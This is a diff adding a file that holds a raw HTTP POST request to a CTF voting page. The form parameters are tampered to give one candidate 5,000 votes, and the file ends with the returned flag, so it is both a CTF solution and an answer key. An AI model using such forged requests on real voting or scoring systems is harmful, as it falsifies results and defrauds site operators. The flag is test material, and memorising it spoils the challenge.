@@ -1,0 +1,17 @@
+POST /snackshackaward/stemmen.php HTTP/1.1
+Host: timesink.be
+Content-Length: 86
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://timesink.be
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://timesink.be/snackshackaward/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+score_bammens=0&score_omejan=0&score_fontainas=0&score_tpleintje=5000&score_frietuurtje=0
+
+Well done! The flag is brixelCTF{bakpau}
